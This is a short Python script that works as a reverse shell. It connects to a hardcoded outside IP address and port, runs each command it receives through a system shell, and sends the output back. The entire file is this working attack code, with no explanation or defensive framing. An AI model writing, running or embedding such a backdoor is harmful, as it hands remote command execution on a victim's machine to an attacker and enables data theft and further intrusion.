import socket,subprocess as sp,sys

conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect(("120.27.250.55",6060))
while True:
	command=str(conn.recv(10024),encoding="utf8")
	if command!="exit()":
		sh=sp.Popen(command,shell=True,
			stdout=sp.PIPE,
			stderr=sp.PIPE,
			stdin=sp.PIPE)
		out,err=sh.communicate()
		result=str(out)
		print(result)
		conn.sendall(str.encode(result))
	else:
		break
conn.close()